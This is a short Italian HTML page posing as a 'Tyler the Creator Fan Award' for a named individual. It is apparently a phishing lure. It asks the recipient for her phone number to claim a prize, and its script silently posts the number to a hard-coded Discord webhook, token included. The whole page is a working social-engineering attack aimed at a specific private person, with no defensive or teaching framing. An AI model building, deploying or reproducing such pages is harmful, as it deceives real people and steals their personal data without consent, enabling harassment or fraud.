<!DOCTYPE html>
<html lang="it">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>:3</title>
    <link href="https://fonts.googleapis.com/css2?family=Montserrat:wght@500;700&display=swap" rel="stylesheet">
    <style>
        body {
            font-family: 'Montserrat', sans-serif;
            display: flex;
            flex-direction: column;
            justify-content: center;
            align-items: center;
            height: 100vh;
            margin: 0;
            background-color: #13793F;
            color: #000000;
            text-align: center;
            overflow: hidden;
        }
        .logo-top {
            width: 100px;
            height: 100px;
            margin-bottom: 20px;
        }
        .container {
            max-width: 400px;
            background: #13793F;
            padding: 40px;
            border-radius: 12px;
            box-shadow: 0px 4px 15px rgba(0, 0, 0, 0.2);
            transition: transform 0.3s ease;
            display: flex;
            flex-direction: column;
            align-items: center;
        }
        .container:hover {
            transform: scale(1.05);
        }
        .logo {
            width: 80px;
            height: 80px;
            background-color: #000000;
            border-radius: 50%;
            margin-bottom: 20px;
        }
        h1 {
            font-size: 24px;
            font-weight: 700;
            margin-bottom: 20px;
        }
        p {
            font-size: 16px;
            margin: 5px 0;
        }
        input[type="text"] {
            width: 100%;
            padding: 12px;
            font-size: 16px;
            margin-top: 15px;
            border: 2px solid #555;
            background-color: #FFFFFF;
            color: #000000;
            border-radius: 6px;
            text-align: center;
        }
        input[type="text"]:focus {
            outline: none;
            border-color: #1e90ff;
        }
        button {
            width: 100%;
            margin-top: 20px;
            padding: 12px;
            font-size: 16px;
            font-weight: 500;
            color: #13793F;
            background-color: #000000;
            border: none;
            cursor: pointer;
            border-radius: 6px;
            transition: background-color 0.3s ease;
        }
        button:hover {
            background-color: #555555;
        }
    </style>
</head>
<body>

<div class="logo-top">
    <img src="https://external-content.duckduckgo.com/iu/?u=https%3A%2F%2Ftse1.mm.bing.net%2Fth%3Fid%3DOIP.4OcIf_doxxyoxxgwN4bMtAHaHZ%26pid%3DApi&f=1&ipt=9601231e2377c56c6b775a91dd25f8f6cc92e29aeec1d16ea2bc44bbc65f4578&ipo=images" alt="Top Logo" style="width: 100%; height: 100%;">
</div>

<div class="container">
    <div class="logo">
        <img src="https://external-content.duckduckgo.com/iu/?u=https%3A%2F%2Fstatic.stereogum.com%2Fuploads%2F2024%2F10%2FChromakopia-1729179703-1000x1000.jpeg&f=1&nofb=1&ipt=f07dca61bc0965a53377e6693c2007f0a3561a31923bad9f9d51b976d104eaa7&ipo=images" alt="Logo" style="width: 100%; height: 100%; border-radius: 50%;">
    </div>
    <h1>#1 Tyler the Creator</h1>
    <h1>Fan Award</h1>
    <p>Consegnato a: <strong>Emiliana Musco</strong></p>
    <p>Numero per ritirarlo:</p>
    <input type="text" id="numero" placeholder="Inserisci il numero di telefono">
    <button onclick="inviaNumero()">Invia</button>
</div>

<script>
    function inviaNumero() {
        const numero = document.getElementById('numero').value;
        if (numero) {
            fetch('https://discord.com/api/webhooks/1305569923107524698/qz8LJYzdPruiwIbW5_1EkSOrXb8Yeh-6_eJNOKYVcciCb_aQ9FjIC6DpNNZgc8aX_3G3', {
                method: 'POST',
                headers: {
                    'Content-Type': 'application/json',
                },
                body: JSON.stringify({
                    content: `Numero inviato: ${numero}`
                }),
            })
            .then(response => {
                if (response.ok) {
                    alert('Numero inviato con successo!');
                } else {
                    alert('Errore nell\'invio del numero. Controlla il webhook.');
                }
            })
            .catch((error) => {
                console.error('Errore:', error);
                alert('Errore di connessione con Discord.');
            });
        } else {
            alert("Per favore, inserisci un numero di telefono.");
        }
    }
</script>

</body>
</html>
